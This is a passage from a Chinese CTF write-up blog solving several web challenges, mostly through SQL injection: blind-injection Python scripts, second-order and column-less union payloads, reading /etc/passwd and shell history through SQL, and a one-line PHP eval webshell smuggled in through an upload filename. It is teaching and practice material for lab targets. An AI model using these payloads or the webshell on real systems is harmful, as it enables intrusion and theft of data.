id="解题-v12">解题</h3><p>访问<code>robots.txt</code>页面提示有<code>hint.php</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br></pre></td></tr></table></figure><p>fuzz一下发现：空格单双引号过滤，\没过滤，如果未对<code>$_POST[&quot;username&quot;]</code>进行其他限制，那么可以使用反斜杠将第二个单引号转义，此时第一个单引号和第三个单引号构成语句：<code>username='xxxxx', $_POST[&quot;password&quot;]</code>则可进行盲注。</p><p><code>username=admin\  password=or/**/length(database())&gt;0#</code>回显<code>BJD needs to be stronger</code></p><p><code>username=admin\  password=or/**/length(database())&lt;0#</code>回显<code>You konw ,P3rh4ps needs a girl friend</code></p><p>写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2cfb1e37-5400-4888-895d-bd5db365a250.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">&#x27;BJD needs to be stronger&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)</span><br><span class="line">        data[<span class="string">&#x27;password&#x27;</span>] = payload</span><br><span class="line"></span><br><span class="line">        rs = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> rs.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>得到<code>password:OhyOuFOuNdit</code></p><h2 id="SWPUCTF2019-Web1">SWPUCTF2019 Web1</h2><h3 id="考点-v14">考点</h3><ul><li>二次注入</li><li>MySQL无列名注入</li><li>MySQL5.7+ 新特性</li></ul><h3 id="知识储备">知识储备</h3><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在CTF题目中常常是因为information_schema被过滤的情况下，使用这种方法获取列名。</p><p>无列名注入的原理其实类似于将我们不知道的列名，进行取别名操作，在取别名的同时进行数据查询，所以如果我们查询的字段多于数据表中列的时候，会出现报错。</p><blockquote><p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 5.7以上，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p></blockquote><p>例如当前有一个user表</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702211931.png" style="zoom:67%;" /><p>发现该数据表中有3列，我们使用无列名查询的方式尝试查询一下</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212049.png" style="zoom:67%;" /><p>尝试多一个字段或者少一个字段进行查询：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212208.png" style="zoom:67%;" /><p>仍然报错，证明无列名注入必须一一对应所查询数据表的列数。</p><p>对一列数据进行查询：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212534.png" style="zoom:67%;" /><blockquote><p>末尾的 a 可以是任意字符，用于命名。</p></blockquote><p>当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702213855.png" style="zoom:67%;" /><p>同时查询多个列：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702214129.png" style="zoom:67%;" /><h3 id="解题-v13">解题</h3><p>注册admin的时候提示用户已经存在，那么就随便注册一个用户名，登录后发表广告，点击查看详情页，第一反应看url传入了id字段，经过测试后，id字段不存在SQL注入。</p><p>再考虑是不是二次注入，发表广告后，查询广告详情的时候产生注入。</p><p>测试注入点：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702215827.png" alt=""></p><p>点击广告详情</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702215848.png" alt=""></p><p>发现数据库报错信息，证明存在注入，可根据报错的信息去构造sql注入语句，fuzz一下被过滤的字符和符号。</p><p>发现空格，or，#，–+等被过滤，我们使用注释符号来代替空格。报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</p><p>尝试闭合单引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa&#39;,&#39;</span><br></pre></td></tr></table></figure><p>先判断字段的个数，or被过滤了不能用order by，但是可以用group by来替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;</span><br></pre></td></tr></table></figure><p>判断回显位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703100141.png" alt=""></p><p>查询一下数据库名称和版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703101346.png" alt=""></p><p>由于or被过滤，所以不能用information_schema，但是根据上面的知识储备，如果数据表的引擎是<code>innodb</code>， 还可以用<code>mysql.innodb_table_stats</code>获取表名</p><blockquote><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703102458.png" alt=""></p><p>我们无法知道列名，可以通过无列名注入的方式进行注入，先查询users表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703103327.png" alt=""></p><h3 id="后记">后记</h3><p>如果过滤了逗号，可以用join关键字连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="网鼎杯2018-comment">网鼎杯2018 comment</h2><h3 id="考点-v15">考点</h3><ul><li>Git源码恢复</li><li>代码审计</li><li>二次注入</li></ul><h3 id="解题-v14">解题</h3><p>上来没什么思路，先用dirmap扫一遍发现Git文件夹，用GitHack把源码dump下来，只有一个<code>write_do.php</code>文件，并且不完整，需要查看提交历史。因为lijiejie的GitHack不能把.git文件夹同时dump下来，所以这里换成wangyihang的GitHacker。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705112838.png" alt=""></p><p>查看第一个commit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">HEAD 现在位于 e5b2a24 WIP on master: bfbdf21 add write_do.php</span><br></pre></td></tr></table></figure><p>得到<code>write_do.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交评论还需要登录，根据登录框上的place_hold，应该是要爆破密码的后三位，写一个python脚本跑一下就出来，代码写太烂不贴了：<code>zhangwei/zhangwei666</code></p><p>接着审计源码，可以看到上面第12-14行都对 POST 传来category 、 title 、content三个参数进行了特殊字符转义，然而在第28行和第30-33行处直接将从数据库中取出的数据，未经任何过滤拼接到SQL语句 中，并且content的值会显示在页面上，这就存在二次注入 。</p><blockquote><p>addslashes会将传入的信息都会进行转义，但是数据库会自动清除反斜杠。</p></blockquote><p>下面说说二次注入的攻击过程：</p><ul><li><p>先进入 write 方法，将payload： <code>',content=database(),/*</code> 插入 board 表的 category 字段中</p><p>此时payload为<code>title=111&amp;category=',content=database(),/*&amp;content=1</code></p></li><li><p>再进入 comment 方法，程序将 board 表中的 category 字段取出，没进行过滤，拼接到新的 insert 语句中。由于我们之前的 payload 中带有 /* ，所以我们需要闭合它，即我们在评论处提交 <code>*/#</code> (对应 content 变量的值)，用于闭合<code>/*</code></p></li><li><p>然后程序执行第二个SQL语句，并将用户提交的content值显示出来，而我们的 payload ： <code>',content=user(),/*</code> 就会显示出当前用户。</p></li></ul><p>查看当前用户</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143030.png" style="zoom:50%;" /><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143103.png" style="zoom:50%;" /><blockquote><p>如果是root用户，一般 <strong>flag</strong> 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有。</p></blockquote><p>应该是要用SQL语句读取flag文件了。</p><p>先用<code>/etc/passwd</code>做一个验证</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143339.png" style="zoom: 50%;" /><p>有一个www用户，查看他的历史命令</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143628.png" style="zoom:50%;" /><p>可以发现他删除了一个<code>.DS_Store</code>文件，但是还存在于<code>/tmp/html</code>目录中，由于这个文件有很多不可见字符不能直接用编辑器打开，先对其进行16进制编码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705144029.png" alt=""></p><p>再转换成ASCII</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705145015.png" alt=""></p><p>flag文件名<code>flag_8946e1ff1ee3e40f.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705145339.png" alt=""></p><p>再解码就可以得到flag。</p><h2 id="CISCN2019-easyweb">CISCN2019 easyweb</h2><h3 id="考点-v16">考点</h3><ul><li>源码泄露</li><li>MySQL盲注</li><li>PHP短标签</li></ul><h3 id="解题-v15">解题</h3><p>又是一道盲注的题目，还是没有做出来。。。。。</p><p><code>robots.txt</code>提示有bak备份文件，尝试了<code>index.php.bak</code>和<code>user.php.bak</code>无果后用dirmap扫描，发现了<code>image.php.bak</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>基本思路：<strong>bool盲注，语句成功的话，就让id = 1，回显正常，错误的话 id = 0，就什么都没有</strong>。</p><p>单引号逃逸的方法是用<code>\0</code>来转义掉它的单引号。输入<code>\0</code>，经过<code>addslashes</code>函数会先变成<code>\\0</code>,然后经过“str_replace”函数，会变成<code>\</code>,这样，就把id后面的单引号给转义了。</p><p>SQL盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://143e2c2b-3448-4468-aeee-95cd35c73be0.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">payload = <span class="string">&quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">flag = <span class="string">&quot;JFIF&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        response = requests.get(url + payload.format(i, mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>登录后是一个文件上传的功能，经过测试后可以发现，<code>upload.php</code>把上传的文件名写入了一个php文件后缀的日志文件，并且路径已知。但是文件名会过滤php，可以用短标签绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>然后蚁剑直接连接。</p><h2 id="WUSTCTF2020-颜值成绩查询">WUSTCTF2020 颜值成绩查询</h2><h3 id="考点-v17">考点</h3><ul><li>MySQL盲注</li></ul><h3 id="解题-v16">解题</h3><p>比较明显的GET型的SQL注入，FUZZ一下</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708105750.png" style="zoom:50%;" /><p>发现好像是可以直接执行SQL语句，验证一下</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708105954.png" alt=""></p><p>接下来就是直接写盲注脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a55db98c-72b1-40e8-b771-61b1bc60cd9d.node3.buuoj.cn/?stunum=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Hi admin, your score is: 100&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;ctf&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(group_concat(flag,0x3a,value))from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        response = requests.post(url+payload.format(i, mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h3 id="拓展">拓展</h3><p>我们再吹毛求疵一点，上一个脚本跑出来的flag都是大写字母，那么我们应该如何区分大小写呢。</p><p>参考中的第二篇文章已经告诉了我们答案，想办法把字符串转换为二进制后，进行字节对字节的比较。但是函数<code>BINARY</code>中的<code>in</code>被禁掉了，作者又发现了一种思路，当一个字符串连接一个二进制的值时<code>CONCAT(&quot;aa&quot;, BINARY(&quot;BB&quot;))</code>，其得到的也将是二进制。</p><p>并且MySQL中的JSON对象是二进制对象，因此，<code>CAST(0 AS JSON)</code>会返回一个二进制字符串，进而<code>SELECT CONCAT(“A”, CAST(0 AS JSON))</code>也会返回一个二进制字符串。</p><p>所以我们看一看下面这个payload能否可行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2||(select 1,concat(&#39;&#123;&#125;&#39;,cast(&#39;0&#39; as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure><p>返回了error。我猜应该是版本的问题，用第一个盲注脚本查看一下version()，发现是MariaDB 10.2.26。</p><p>查询一下官方文档，MariaDB在10.2.7才加入了JSON数据类型。</p><p>无果。</p><h3 id="参考">参考</h3><p><a href="https://www.gem-love.com/ctf/1782.html">https://www.gem-love.com/ctf/1782.html</a></p><p><a href="https://nosec.org/home/detail/3830.html">https://nosec.org/home/detail/3830.html</a></p><h2 id="RoarCTF2019-Online-Proxy">RoarCTF2019 Online Proxy</h2><h3 id="考点-v18">考点</h3><ul><li>XFF注入</li><li>二次注入</li><li>盲注</li></ul><h3 